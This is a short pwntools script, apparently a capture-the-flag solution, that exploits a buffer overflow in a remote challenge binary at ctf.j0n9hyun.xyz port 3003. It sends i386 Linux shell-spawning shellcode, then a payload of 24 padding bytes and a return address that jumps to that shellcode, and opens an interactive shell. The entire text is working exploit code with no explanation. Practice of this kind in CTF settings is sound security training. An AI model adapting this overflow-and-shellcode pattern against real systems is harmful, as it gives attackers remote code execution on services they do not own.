from pwn import *

#r = process('./prob1')
r = remote('ctf.j0n9hyun.xyz', 3003)

context(arch='i386', os='linux')
shellcode = asm(shellcraft.i386.linux.sh())

payload = ''
payload += "A"*24
payload += p32(0x804a060)

r.recvuntil(': ')
r.send(shellcode)
r.recvuntil(': ')
r.send(payload)
r.interactive()
